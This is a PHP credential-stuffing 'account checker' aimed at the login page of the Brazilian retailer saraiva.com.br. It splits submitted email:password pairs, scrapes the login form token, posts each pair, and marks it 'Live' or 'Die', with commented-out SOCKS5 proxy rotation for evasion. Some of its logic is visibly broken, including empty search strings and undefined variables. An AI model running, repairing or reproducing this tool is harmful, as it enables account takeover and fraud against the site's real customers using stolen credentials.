<?php

require ('./class_mail.php');
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
if ($_POST['do'] == 'check')
{
	
    $mail = new Mail();
    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0');
   
    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
    //$sock = urldecode($_POST['sock']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
    //$curl->sock5($sock);
	$curl->page('http://www.saraiva.com.br/central/central.dll/login');
	if($curl->validate()){
		
		$appActionToken = getStr($curl->content,'name="form_key" value="','"');
		$var = 'form_key='.urlencode($appActionToken).'&login%5Busername%5D='.$email.'&login%5Bpassword%5D='.$pwd.'&send=';
		$curl->postdata($var);
		//$curl->ref($ref);

		if($curl->validate()){
		
		
		//	file_put_contents('text.html', $curl->content);
			 
			 if(stripos($curl->content, "") == false){
				$result['error'] = 0;
				$result['msg'] = $result['msg'] = '<b style="color:yellow;">Live</b> =>  | ' . $email .
                        ' | ' .$pwd.' | <font color="yellow">'.$cc5.'|</font> Checked'; 
			 

			 }
			 elseif(stripos($curl->content, "") !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>